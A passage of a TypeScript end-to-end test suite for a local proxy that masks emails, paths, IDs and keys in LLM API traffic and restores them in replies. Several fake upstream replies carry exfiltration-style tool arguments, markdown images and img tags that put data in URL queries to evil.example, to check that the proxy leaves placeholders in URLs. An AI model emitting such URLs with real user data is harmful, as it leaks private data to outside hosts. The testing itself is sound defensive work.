// End to end: a client talks to the proxy, the proxy talks to a fake upstream
// on 127.0.0.1 that answers with the placeholders it received, split into
// 3-character SSE chunks so every placeholder straddles chunk boundaries.
import { createServer, request } from 'node:http'
import type { IncomingHttpHeaders, Server } from 'node:http'
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest'
import { loadConfig } from '../src/proxy/config.ts'
import type { ProxyConfig } from '../src/proxy/config.ts'
import { createProxyServer, listen } from '../src/proxy/server.ts'

// Every value is fictional: example.test addresses, a checksum-valid invented
// national ID, a made-up key, and a made-up home path.
const EMAIL = 'lin.fictional@example.test'
const HOME = '/Users/fictional-user'
const TWID = 'A123456789'
const KEY = 'sk-FICTIONALfictional0123456789abcd'
const QUOTED = 'Proj "Q"\\x'
const ORIGINALS = [EMAIL, HOME, TWID, KEY, QUOTED]

interface Seen {
  url: string
  headers: IncomingHttpHeaders
  raw: string
  body: any
}

type Reply = (seen: Seen) => { json?: unknown; sse?: string[]; status?: number }

let upstream: Server
let proxy: Server
let base = ''
let seen: Seen[] = []
let reply: Reply = () => ({ json: {} })
const logs: string[] = []

function chunk(text: string, size = 3): string[] {
  const out: string[] = []
  for (let i = 0; i < text.length; i += size) out.push(text.slice(i, i + size))
  return out
}

/** Placeholders in a received body, in order of first appearance. */
function placeholders(raw: string): string[] {
  return [...new Set(raw.match(/⟦[A-Z0-9_]+⟧/g) ?? [])]
}

async function start(overrides: Partial<ProxyConfig> = {}): Promise<void> {
  if (proxy !== undefined) await new Promise(resolve => proxy.close(resolve))
  const port = (upstream.address() as { port: number }).port
  const config = {
    ...loadConfig(undefined, {
      REDACTION_PROXY_OPENAI_UPSTREAM: `http://127.0.0.1:${port}`,
      REDACTION_PROXY_ANTHROPIC_UPSTREAM: `http://127.0.0.1:${port}/anthropic`,
    }),
    redaction: { projectNames: [QUOTED] },
    ...overrides,
  }
  proxy = createProxyServer(config, line => logs.push(line))
  base = `http://127.0.0.1:${await listen(proxy, 0)}`
}

beforeAll(async () => {
  upstream = createServer((req, res) => {
    let raw = ''
    req.setEncoding('utf8')
    req.on('data', (part: string) => { raw += part })
    req.on('end', () => {
      const entry: Seen = { url: req.url ?? '', headers: req.headers, raw, body: raw === '' ? undefined : JSON.parse(raw) }
      seen.push(entry)
      const answer = reply(entry)
      if (answer.sse !== undefined) {
        res.writeHead(answer.status ?? 200, { 'content-type': 'text/event-stream' })
        // Split the wire bytes as well, so event boundaries also straddle reads.
        const wire = answer.sse.join('')
        let i = 0
        const pump = (): void => {
          if (i >= wire.length) return void res.end()
          res.write(wire.slice(i, i + 7))
          i += 7
          setImmediate(pump)
        }
        pump()
        return
      }
      res.writeHead(answer.status ?? 200, { 'content-type': 'application/json' })
      res.end(JSON.stringify(answer.json))
    })
  })
  await new Promise<void>(resolve => upstream.listen(0, '127.0.0.1', resolve))
  await start()
})

afterAll(async () => {
  await new Promise(resolve => proxy.close(resolve))
  await new Promise(resolve => upstream.close(resolve))
})

beforeEach(() => {
  seen = []
  logs.length = 0
})

function sse(events: Array<[string | undefined, unknown]>): string[] {
  return events.map(([name, data]) => `${name === undefined ? '' : `event: ${name}\n`}data: ${typeof data === 'string' ? data : JSON.stringify(data)}\n\n`)
}

async function post(path: string, body: unknown, headers: Record<string, string> = {}): Promise<Response> {
  return fetch(base + path, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(body) })
}

function events(text: string): any[] {
  return text.split('\n\n').filter(block => block.includes('data: ') && !block.includes('[DONE]'))
    .map(block => JSON.parse(block.split('\n').find(line => line.startsWith('data: '))!.slice(6)))
}

const USER_TEXT = `Mail ${EMAIL} the file ${HOME}/notes.md, ID ${TWID}, key ${KEY}, project ${QUOTED}.`

function expectMasked(entry: Seen): string[] {
  for (const original of ORIGINALS) {
    expect(entry.raw).not.toContain(original)
    expect(entry.raw).not.toContain(JSON.stringify(original).slice(1, -1))
  }
  const found = placeholders(entry.raw)
  expect(found.length).toBeGreaterThanOrEqual(5)
  return found
}

describe('OpenAI Chat Completions', () => {
  const request = {
    model: 'm',
    messages: [{ role: 'system', content: 'You are terse.' }, { role: 'user', content: USER_TEXT }],
    tools: [{ type: 'function', function: { name: 'send', description: 'send mail', parameters: { type: 'object' } } }],
  }

  it('masks the request, forwards credentials, and restores a JSON reply', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      return {
        json: {
          id: 'c1',
          choices: [{
            index: 0,
            message: {
              role: 'assistant',
              content: `Echo: ${ids.join(' ')}`,
              tool_calls: [{ id: 't1', type: 'function', function: { name: 'send', arguments: JSON.stringify({ to: ids, unknown: '⟦EMAIL_99⟧' }) } }],
            },
            finish_reason: 'tool_calls',
          }],
        },
      }
    }
    const res = await post('/v1/chat/completions', request, { authorization: 'Bearer client-key' })
    expect(res.status).toBe(200)
    const [entry] = seen
    expect(entry!.headers.authorization).toBe('Bearer client-key')
    expect(entry!.headers['accept-encoding']).toBe('identity')
    const ids = expectMasked(entry!)
    const body = await res.json() as any
    const message = body.choices[0].message
    for (const original of ORIGINALS) expect(message.content).toContain(original)
    const args = JSON.parse(message.tool_calls[0].function.arguments)
    expect(args.to).toHaveLength(ids.length)
    expect(args.to).toEqual(expect.arrayContaining([EMAIL, HOME, TWID, KEY, QUOTED]))
    expect(args.unknown).toBe('⟦EMAIL_99⟧')
    expect(logs.join('\n')).not.toContain(EMAIL)
    expect(logs.at(-1)).toMatch(/-> 200 masked \d+ \(.*EMAIL 1.*\) restored \d+ unknown 1/)
  })

  it('restores a streamed reply across chunk boundaries, including tool-call JSON', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      const content = `Echo: ${ids.join(' and ')} done`
      const args = JSON.stringify({ to: ids })
      const env = { id: 'c2', object: 'chat.completion.chunk', model: 'm' }
      return {
        sse: [
          ...sse(chunk(content).map(part => [undefined, { ...env, choices: [{ index: 0, delta: { content: part }, finish_reason: null }] }])),
          ...sse(chunk(args).map(part => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: part } }] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: { content: ' tail ⟦EMAIL_1' }, finish_reason: null }] }]]),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: { content: ' end ⟦PATH_1' }, finish_reason: 'stop' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const res = await post('/v1/chat/completions', { ...request, stream: true })
    const text = await res.text()
    expect(text.trimEnd().endsWith('data: [DONE]')).toBe(true)
    const deltas = events(text).flatMap(event => event.choices.map((choice: any) => choice.delta))
    const content = deltas.map(delta => delta.content ?? '').join('')
    const args = deltas.flatMap(delta => delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
    expect(content).toContain(`Echo: `)
    for (const original of ORIGINALS) expect(content).toContain(original)
    // Unclosed placeholders are released as text in order, the last one inside the finishing chunk.
    expect(content.endsWith(' tail ⟦EMAIL_1 end ⟦PATH_1')).toBe(true)
    expect(JSON.parse(args).to).toEqual(expect.arrayContaining(ORIGINALS))
    expect(text).not.toMatch(/⟦(?:EMAIL|PATH|TWID|KEY|PROJECT)_\d+⟧/)
  })

  it('numbers the request head (tools, system) before the messages', async () => {
    reply = () => ({ json: { choices: [] } })
    const other = 'wang.fictional@example.test'
    await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `to ${EMAIL}` }], tools: [{ type: 'function', function: { name: 'f', description: `cc ${other}` } }] })
    expect(seen[0]!.body.tools[0].function.description).toBe('cc ⟦EMAIL_1⟧')
    expect(seen[0]!.body.messages[0].content).toBe('to ⟦EMAIL_2⟧')
  })

  it('keeps identities stable across turns of one conversation', async () => {
    reply = () => ({ json: { choices: [] } })
    const turn1 = { model: 'm', messages: [{ role: 'user', content: `a ${EMAIL}` }] }
    const turn2 = { model: 'm', messages: [...turn1.messages, { role: 'assistant', content: `ok ${EMAIL}` }, { role: 'user', content: `b ${TWID} ${EMAIL}` }] }
    await post('/v1/chat/completions', turn1)
    await post('/v1/chat/completions', turn2)
    expect(seen[0]!.body.messages[0].content).toBe('a ⟦EMAIL_1⟧')
    expect(seen[1]!.body.messages.map((message: any) => message.content)).toEqual(['a ⟦EMAIL_1⟧', 'ok ⟦EMAIL_1⟧', 'b ⟦TWID_1⟧ ⟦EMAIL_1⟧'])
  })
})

describe('Anthropic Messages', () => {
  const thinking = { type: 'thinking', thinking: `about ⟦EMAIL_1⟧ and ${EMAIL.length}`, signature: 'sig==' }
  const request = {
    model: 'claude',
    max_tokens: 100,
    system: [{ type: 'text', text: `cwd ${HOME}/repo` }],
    messages: [
      { role: 'user', content: [{ type: 'text', text: USER_TEXT }] },
      { role: 'assistant', content: [thinking, { type: 'tool_use', id: 'tu1', name: 'read', input: { path: `${HOME}/repo/a.md` } }] },
      { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu1', content: `owner ${EMAIL}` }, { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'iVBORw0KGgo=' } }] },
    ],
    metadata: { user_id: 'user_abc' },
  }

  it('masks text and tool input, resends signed thinking unchanged, and restores a stream', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw).filter(id => id !== '⟦EMAIL_1⟧' || true)
      const text = `Echo ${ids.join(' ')}`
      const input = JSON.stringify({ path: `${ids.find(id => id.startsWith('⟦PATH'))}/b.md`, note: ids.find(id => id.startsWith('⟦PROJECT')) })
      return {
        sse: sse([
          ['message_start', { type: 'message_start', message: { id: 'm1', role: 'assistant', content: [], model: 'claude' } }],
          ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'thinking', thinking: '' } }],
          ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'thinking_delta', thinking: 'mask ⟦EMAIL_1⟧ seen' } }],
          ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'signature_delta', signature: 'sig2' } }],
          ['content_block_stop', { type: 'content_block_stop', index: 0 }],
          ['content_block_start', { type: 'content_block_start', index: 1, content_block: { type: 'text', text: '' } }],
          ...chunk(`${text} tail ⟦PATH`).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 1, delta: { type: 'text_delta', text: part } }]),
          ['content_block_stop', { type: 'content_block_stop', index: 1 }],
          ['content_block_start', { type: 'content_block_start', index: 2, content_block: { type: 'tool_use', id: 'tu2', name: 'read', input: {} } }],
          ...chunk(input, 2).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 2, delta: { type: 'input_json_delta', partial_json: part } }]),
          ['content_block_stop', { type: 'content_block_stop', index: 2 }],
          ['message_delta', { type: 'message_delta', delta: { stop_reason: 'tool_use' } }],
          ['message_stop', { type: 'message_stop' }],
        ]),
      }
    }
    const res = await post('/v1/messages', { ...request, stream: true }, { 'x-api-key': 'client-key', 'anthropic-version': '2023-06-01' })
    expect(res.status).toBe(200)
    const [entry] = seen
    expect(entry!.url).toBe('/anthropic/v1/messages')
    expect(entry!.headers['x-api-key']).toBe('client-key')
    expectMasked(entry!)
    expect(entry!.body.messages[1].content[0]).toEqual(thinking)
    expect(entry!.body.messages[1].content[1].input.path).toMatch(/^⟦PATH_\d+⟧\/repo\/a\.md$/)
    expect(entry!.body.messages[2].content[1].source.data).toBe('iVBORw0KGgo=')
    expect(entry!.body.metadata).toEqual({ user_id: 'user_abc' })

    const all = events(await res.text())
    const text = all.filter(e => e.delta?.type === 'text_delta').map(e => e.delta.text).join('')
    const json = all.filter(e => e.delta?.type === 'input_json_delta').map(e => e.delta.partial_json).join('')
    const thought = all.filter(e => e.delta?.type === 'thinking_delta').map(e => e.delta.thinking).join('')
    for (const original of ORIGINALS) expect(text).toContain(original)
    expect(text.endsWith(' tail ⟦PATH')).toBe(true)
    expect(JSON.parse(json)).toEqual({ path: `${HOME}/b.md`, note: QUOTED })
    expect(thought).toBe('mask ⟦EMAIL_1⟧ seen')
  })

  it('restores a JSON reply: text and tool input, not signed thinking', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      const path = ids.find(id => id.startsWith('⟦PATH'))
      return {
        json: {
          id: 'm2', type: 'message', role: 'assistant', model: 'claude', stop_reason: 'tool_use',
          content: [
            { type: 'thinking', thinking: `consider ${path}`, signature: 'sig3' },
            { type: 'text', text: `Reading ${path}/c.md for ${ids.find(id => id.startsWith('⟦EMAIL'))}` },
            { type: 'tool_use', id: 'tu3', name: 'read', input: { path: `${path}/c.md`, tags: [ids.find(id => id.startsWith('⟦PROJECT'))] } },
          ],
        },
      }
    }
    const res = await post('/v1/messages', request, { 'x-api-key': 'k' })
    const body = await res.json() as any
    expect(body.content[0].thinking).toMatch(/^consider ⟦PATH_\d+⟧$/)
    expect(body.content[1].text).toBe(`Reading ${HOME}/c.md for ${EMAIL}`)
    expect(body.content[2].input).toEqual({ path: `${HOME}/c.md`, tags: [QUOTED] })
  })

  it('masks a plain-text document and objects under keys whose strings it skips', async () => {
    reply = () => ({ json: { content: [] } })
    const document = { type: 'document', source: { type: 'text', media_type: 'text/plain', data: `Customer file. Email ${EMAIL}, ID ${TWID}` } }
    const properties = { name: { type: 'string', description: `defaults to ${EMAIL}` }, data: { type: 'string', description: `owner ${TWID}` } }
    const res = await post('/v1/messages', {
      model: 'claude', max_tokens: 1, stop_sequences: ['END'], metadata: { user_id: 'user_abc' },
      tools: [{ name: 'lookup', input_schema: { type: 'object', properties } }],
      messages: [{ role: 'user', content: [document, { type: 'text', text: 'Summarize the file.' }] }],
    }, { 'x-api-key': 'k' })
    expect(res.status).toBe(200)
    const [entry] = seen
    expect(entry!.raw).not.toContain(EMAIL)
    expect(entry!.raw).not.toContain(TWID)
    expect(entry!.body.messages[0].content[0].source).toEqual({ type: 'text', media_type: 'text/plain', data: 'Customer file. Email ⟦EMAIL_1⟧, ID ⟦TWID_1⟧' })
    expect(entry!.body.stop_sequences).toEqual(['END'])
    expect(entry!.body.metadata).toEqual({ user_id: 'user_abc' })
  })

  it('masks count_tokens requests too', async () => {
    reply = () => ({ json: { input_tokens: 42 } })
    const res = await post('/v1/messages/count_tokens', request, { 'x-api-key': 'k' })
    expect(await res.json()).toEqual({ input_tokens: 42 })
    expectMasked(seen[0]!)
  })
})

describe('OpenAI Responses', () => {
  it('restores a stream and keeps identities for a previous_response_id continuation', async () => {
    reply = entry => {
      const ids = placeholders(entry.raw)
      const text = `Echo ${ids.join(' ')}`
      const args = JSON.stringify({ to: ids[0] })
      return {
        sse: sse([
          ['response.created', { type: 'response.created', response: { id: 'r1', output: [] } }],
          ...chunk(text).map((part): [string, unknown] => ['response.output_text.delta', { type: 'response.output_text.delta', item_id: 'i1', output_index: 0, content_index: 0, delta: part }]),
          ['response.output_text.done', { type: 'response.output_text.done', item_id: 'i1', output_index: 0, content_index: 0, text }],
          ...chunk(args).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'i2', output_index: 1, delta: part }]),
          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'i2', output_index: 1, arguments: args }],
          ['response.completed', { type: 'response.completed', response: { id: 'r1', output: [{ type: 'message', content: [{ type: 'output_text', text }] }] } }],
        ]),
      }
    }
    const res = await post('/v1/responses', { model: 'm', stream: true, instructions: `cwd ${HOME}`, input: [{ role: 'user', content: [{ type: 'input_text', text: USER_TEXT }] }] })
    expectMasked(seen[0]!)
    const all = events(await res.text())
    const streamed = all.filter(e => e.type === 'response.output_text.delta').map(e => e.delta).join('')
    const done = all.find(e => e.type === 'response.output_text.done').text
    const completed = all.find(e => e.type === 'response.completed').response.output[0].content[0].text
    expect(streamed).toBe(done)
    expect(completed).toBe(done)
    for (const original of ORIGINALS) expect(done).toContain(original)
    const args = all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')
    expect(JSON.parse(args)).toEqual(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments))

    reply = () => ({ json: { id: 'r2', output: [] } })
    await post('/v1/responses', { model: 'm', previous_response_id: 'r1', input: `again ${EMAIL} and new ${'B123456780'}` })
    const firstEmail = seen[0]!.raw.match(/⟦EMAIL_\d+⟧/)![0]
    expect(seen[1]!.body.input).toMatch(new RegExp(`^again ${firstEmail} and new ⟦TWID_2⟧$`))
  })
})

describe('state kept per client credential', () => {
  const PASS = 'Tr0ub4dor&3x'

  it('masks a value it restored earlier once later history drops the context that detected it', async () => {
    reply = () => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: 'Noted. Use ⟦KEY_1⟧ to log in.' } }] } })
    const first = await (await post('/v1/chat/completions', { model: 'm', messages: [{ role: 'user', content: `password: ${PASS}` }] }, { authorization: 'Bearer client-a' })).json() as any
    const echo = first.choices[0].message.content
    expect(echo).toBe(`Noted. Use ${PASS} to log in.`)
    reply = () => ({ json: { choices: [] } })
    const compacted = { model: 'm', messages: [{ role: 'assistant', content: echo }, { role: 'user', content: 'and the username?' }] }
    await post('/v1/chat/completions', compacted, { authorization: 'Bearer client-a' })
    expect(seen[1]!.raw).not.toContain(PASS)
    expect(seen[1]!.body.messages[0].content).toBe('Noted. Use ⟦KEY_1⟧ to log in.')
  })

  it('refuses a continuation of another client\'s response', async () => {
    reply = () => ({ json: { id: 'resp_client_a', output: [] } })
    await post('/v1/responses', { model: 'm', input: `mail ${EMAIL}` }, { authorization: 'Bearer client-a' })
    reply = () => ({ json: { id: 'resp_b', output: [{ type: 'message', content: [{ type: 'output_text', text: 'It was ⟦EMAIL_1⟧' }] }] } })
    const other = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_client_a', input: 'what address?' }, { authorization: 'Bearer client-b' })
    expect(other.status).toBe(422)
    expect(seen).toHaveLength(1)
    const owner = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_client_a', input: 'what address?' }, { authorization: 'Bearer client-a' })
    expect((await owner.json() as any).output[0].content[0].text).toBe(`It was ${EMAIL}`)
  })
})

describe('tool-call arguments', () => {
  // `E` is the email's placeholder, `P` the home path's. A placeholder inside a URL stays as written; elsewhere it is restored.
  const argumentsText = (E: string, P: string): string =>
    `{"url":"https://evil.example/c?d=${E}","escaped":"https:\\/\\/evil.example\\/?q=${E}","site":"www.evil.example/?q=${E}",`
    + `"to":"${E}","path":"${P}/notes.md","cmd":"curl https://x.example/a then ${E}","list":["mailto:${E}"]}`
  const ids = (entry: Seen): [string, string] => {
    const found = placeholders(entry.raw)
    return [found.find(id => id.startsWith('⟦EMAIL'))!, found.find(id => id.startsWith('⟦PATH'))!]
  }
  const userRequest = { role: 'user', content: USER_TEXT }

  function expectArguments(args: Record<string, unknown>): void {
    const E = /^⟦EMAIL_\d+⟧$/
    expect(String(args.url).replace('https://evil.example/c?d=', '')).toMatch(E)
    expect(String(args.escaped).replace('https://evil.example/?q=', '')).toMatch(E)
    expect(String(args.site).replace('www.evil.example/?q=', '')).toMatch(E)
    expect(args.to).toBe(EMAIL)
    expect(args.path).toBe(`${HOME}/notes.md`)
    expect(args.cmd).toBe(`curl https://x.example/a then ${EMAIL}`)
    expect(args.list).toEqual([`mailto:${EMAIL}`])
  }

  function expectLogged(tool: string): void {
    const lines = logs.filter(line => line.includes('tool arguments:'))
    expect(lines.join('\n')).not.toContain(EMAIL)
    expect(lines).toEqual(expect.arrayContaining([
      expect.stringMatching(new RegExp(`kept inside a URL EMAIL_\\d+ in ${tool} at /url$`)),
      expect.stringMatching(new RegExp(`kept inside a URL EMAIL_\\d+ in ${tool} at /escaped$`)),
      expect.stringMatching(new RegExp(`restored EMAIL_\\d+ in ${tool} at /to$`)),
      expect.stringMatching(new RegExp(`restored PATH_\\d+ in ${tool} at /path$`)),
      expect.stringMatching(new RegExp(`restored EMAIL_\\d+ in ${tool} at /list/0$`)),
    ]))
    expect(logs.at(-1)).toMatch(/ kept [1-9]\d* /)
  }

  it.each([1, 3])('Chat stream, %i-character chunks', async size => {
    reply = entry => {
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const call = (part: string, first: boolean) => ({ index: 0, ...first ? { id: 't', type: 'function' } : {}, function: { ...first ? { name: 'fetch' } : {}, arguments: part } })
      return {
        sse: [
          ...sse(chunk(argumentsText(...ids(entry)), size).map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [call(part, i === 0)] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const args = events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join('')
    expectArguments(JSON.parse(args))
    expectLogged('fetch')
  })

  it('Chat JSON reply', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', tool_calls: [{ id: 't', type: 'function', function: { name: 'fetch', arguments: argumentsText(...ids(entry)) } }] } }] } })
    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    expectArguments(JSON.parse(body.choices[0].message.tool_calls[0].function.arguments))
    expectLogged('fetch')
  })

  it.each([1, 2])('Anthropic stream, %i-character chunks', async size => {
    reply = entry => ({
      sse: sse([
        ['message_start', { type: 'message_start', message: { id: 'm', role: 'assistant', content: [] } }],
        ['content_block_start', { type: 'content_block_start', index: 0, content_block: { type: 'tool_use', id: 'tu', name: 'web_fetch', input: {} } }],
        ...chunk(argumentsText(...ids(entry)), size).map((part): [string, unknown] => ['content_block_delta', { type: 'content_block_delta', index: 0, delta: { type: 'input_json_delta', partial_json: part } }]),
        ['content_block_stop', { type: 'content_block_stop', index: 0 }],
        ['message_stop', { type: 'message_stop' }],
      ]),
    })
    const text = await (await post('/v1/messages', { model: 'c', max_tokens: 1, stream: true, messages: [userRequest] }, { 'x-api-key': 'k' })).text()
    expectArguments(JSON.parse(events(text).filter(e => e.delta?.type === 'input_json_delta').map(e => e.delta.partial_json).join('')))
    expectLogged('web_fetch')
  })

  it('Anthropic JSON reply: tool input as an object', async () => {
    reply = entry => ({ json: { id: 'm', type: 'message', content: [{ type: 'tool_use', id: 'tu', name: 'web_fetch', input: JSON.parse(argumentsText(...ids(entry))) }] } })
    const body = await (await post('/v1/messages', { model: 'c', max_tokens: 1, messages: [userRequest] }, { 'x-api-key': 'k' })).json() as any
    expectArguments(body.content[0].input)
    expectLogged('web_fetch')
  })

  it.each([1, 3])('Responses stream, %i-character chunks, and the repeated done events', async size => {
    reply = entry => {
      const args = argumentsText(...ids(entry))
      const item = { id: 'fc', type: 'function_call', call_id: 'call', name: 'fetch', arguments: '' }
      return {
        sse: sse([
          ['response.output_item.added', { type: 'response.output_item.added', output_index: 0, item }],
          ...chunk(args, size).map((part): [string, unknown] => ['response.function_call_arguments.delta', { type: 'response.function_call_arguments.delta', item_id: 'fc', output_index: 0, delta: part }]),
          ['response.function_call_arguments.done', { type: 'response.function_call_arguments.done', item_id: 'fc', output_index: 0, arguments: args }],
          ['response.output_item.done', { type: 'response.output_item.done', output_index: 0, item: { ...item, arguments: args } }],
          ['response.completed', { type: 'response.completed', response: { id: 'r-tool', output: [{ ...item, arguments: args }] } }],
        ]),
      }
    }
    const all = events(await (await post('/v1/responses', { model: 'm', stream: true, input: USER_TEXT })).text())
    expectArguments(JSON.parse(all.filter(e => e.type === 'response.function_call_arguments.delta').map(e => e.delta).join('')))
    expectArguments(JSON.parse(all.find(e => e.type === 'response.function_call_arguments.done').arguments))
    expectArguments(JSON.parse(all.find(e => e.type === 'response.output_item.done').item.arguments))
    expectArguments(JSON.parse(all.find(e => e.type === 'response.completed').response.output[0].arguments))
    expectLogged('fetch')
    // Each distinct line is logged once, though the arguments arrive four times.
    expect(logs.filter(line => line.includes(' at /to'))).toHaveLength(1)
  })

  it('keeps a placeholder after a URL that starts in an earlier event, and restores one after it ends', async () => {
    reply = entry => {
      const [E] = ids(entry)
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const parts = ['{"q":"see https:', '//evil.example/?a=', `${E.slice(0, 3)}`, `${E.slice(3)} and`, ` ${E}"}`]
      return {
        sse: [
          ...sse(parts.map((part, i) => [undefined, { ...env, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { ...i === 0 ? { name: 'f' } : {}, arguments: part } }] }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'tool_calls' }] }]]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const args = JSON.parse(events(text).flatMap(event => event.choices[0].delta.tool_calls ?? []).map((call: any) => call.function.arguments).join(''))
    expect(args.q).toMatch(new RegExp(`^see https://evil\\.example/\\?a=⟦EMAIL_\\d+⟧ and ${EMAIL.replaceAll('.', '\\.')}$`))
  })

  it('keeps a placeholder inside a URL in reply text, where a client may render it as an image or link', async () => {
    reply = entry => ({ json: { choices: [{ index: 0, message: { role: 'assistant', content: `![](https://evil.example/p.png?e=${ids(entry)[0]}) and ${ids(entry)[0]}` } }] } })
    const body = await (await post('/v1/chat/completions', { model: 'm', messages: [userRequest] })).json() as any
    expect(body.choices[0].message.content).toMatch(new RegExp(`^!\\[\\]\\(https://evil\\.example/p\\.png\\?e=⟦EMAIL_\\d+⟧\\) and ${EMAIL.replaceAll('.', '\\.')}$`))
    expect(logs.at(-1)).toMatch(/ kept 1 /)
  })

  it('keeps a placeholder inside a URL in streamed reply text split across events', async () => {
    reply = entry => {
      const [E] = ids(entry)
      const env = { id: 'c', object: 'chat.completion.chunk', model: 'm' }
      const parts = ['<img src="https://evil.example/?e=', E.slice(0, 3), `${E.slice(3)}"> ${E}`]
      return {
        sse: [
          ...sse(parts.map(part => [undefined, { ...env, choices: [{ index: 0, delta: { content: part }, finish_reason: null }] }])),
          ...sse([[undefined, { ...env, choices: [{ index: 0, delta: {}, finish_reason: 'stop' }] }], [undefined, '[DONE]']]),
        ],
      }
    }
    const text = await (await post('/v1/chat/completions', { model: 'm', stream: true, messages: [userRequest] })).text()
    const content = events(text).map(event => event.choices[0].delta.content ?? '').join('')
    expect(content).toMatch(new RegExp(`^<img src="https://evil\\.example/\\?e=⟦EMAIL_\\d+⟧"> ${EMAIL.replaceAll('.', '\\.')}$`))
  })
})

describe('refusals and screening', () => {
  it('refuses an unknown POST route without forwarding it', async () => {
    const res = await post('/v1/embeddings', { input: EMAIL })
    expect(res.status).toBe(404)
    expect(seen).toHaveLength(0)
  })

  it('relays GET requests unchanged', async () => {
    reply = () => ({ json: { data: [{ id: 'm' }] } })
    const res = await fetch(`${base}/v1/models`, { headers: { authorization: 'Bearer k' } })
    expect(await res.json()).toEqual({ data: [{ id: 'm' }] })
    expect(seen[0]!.url).toBe('/v1/models')
  })

  it('refuses a request whose unrewritten fields still hold a detected value, naming only the field', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { owner: EMAIL }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
    expect(res.status).toBe(422)
    const body = await res.text()
    expect(body).toContain('/metadata/owner')
    expect((await post('/v1/chat/completions', { model: 'm', stop: [EMAIL], messages: [{ role: 'user', content: `hi ${EMAIL}` }] })).status).toBe(422)
    expect(body).not.toContain(EMAIL)
    expect(seen).toHaveLength(0)
  })

  it('refuses a rules value glued into a longer token or URL, and a one-character term', async () => {
    const glued = [
      { metadata: { ref: `X${TWID}` }, messages: [{ role: 'user', content: `id ${TWID}` }] },
      { messages: [{ role: 'user', content: `key ${KEY}` }, { role: 'user', content: [{ type: 'image_url', image_url: { url: `https://img.example.test/a?tok${KEY}` } }] }] },
      { messages: [{ role: 'user', content: `id ${TWID}` }, { role: 'tool', tool_call_id: 't', content: `ref${TWID}` }] },
    ]
    for (const body of glued) expect((await post('/v1/chat/completions', { model: 'm', ...body })).status).toBe(422)
    await start({ redaction: { terms: ['Q'] } })
    try {
      const res = await post('/v1/chat/completions', { model: 'm', metadata: { tag: 'Q' }, messages: [{ role: 'user', content: 'project Q is late' }] })
      expect(res.status).toBe(422)
      expect(seen).toHaveLength(0)
    } finally {
      await start()
    }
  })

  it('refuses a request from a browser origin or for a rebound host name, without forwarding it', async () => {
    const send = (headers: Record<string, string>): Promise<number> => new Promise((resolve, reject) => {
      const body = JSON.stringify({ model: 'm', messages: [{ role: 'user', content: 'hi' }] })
      const req = request(`${base}/v1/chat/completions`, { method: 'POST', headers: { 'content-type': 'text/plain', ...headers } }, res => {
        res.resume()
        resolve(res.statusCode ?? 0)
      })
      req.on('error', reject)
      req.end(body)
    })
    reply = () => ({ json: { choices: [] } })
    expect(await send({ origin: 'https://evil.example' })).toBe(403)
    expect(await send({ origin: 'null' })).toBe(403)
    expect(await send({ host: 'rebound.example:8787' })).toBe(403)
    expect(seen).toHaveLength(0)
    expect(await send({ origin: 'http://localhost:3000' })).toBe(200)
    expect(await send({ host: 'localhost:8787' })).toBe(200)
  })

  it('refuses a body over the size limit without forwarding it', async () => {
    const res = await fetch(`${base}/v1/chat/completions`, { method: 'POST', body: Buffer.alloc(64 * 1024 * 1024 + 1, 32) })
    expect(res.status).toBe(413)
    expect(seen).toHaveLength(0)
  })

  it('refuses a continuation whose earlier texts it does not hold', async () => {
    const res = await post('/v1/responses', { model: 'm', previous_response_id: 'resp_unknown', input: `mail ${EMAIL}` })
    expect(res.status).toBe(422)
    expect(seen).toHaveLength(0)
  })

  it('names a key that holds a detected value as <key>, in the reply and the log', async () => {
    const res = await post('/v1/chat/completions', { model: 'm', metadata: { [EMAIL]: { note: EMAIL } }, messages: [{ role: 'user', content: `hi ${EMAIL}` }] })
    expect(res.status).toBe(422)
    const body = await res.text()
    expect(body).toContain('/metadata/<key>')
    expect(body).not.toContain(EMAIL)
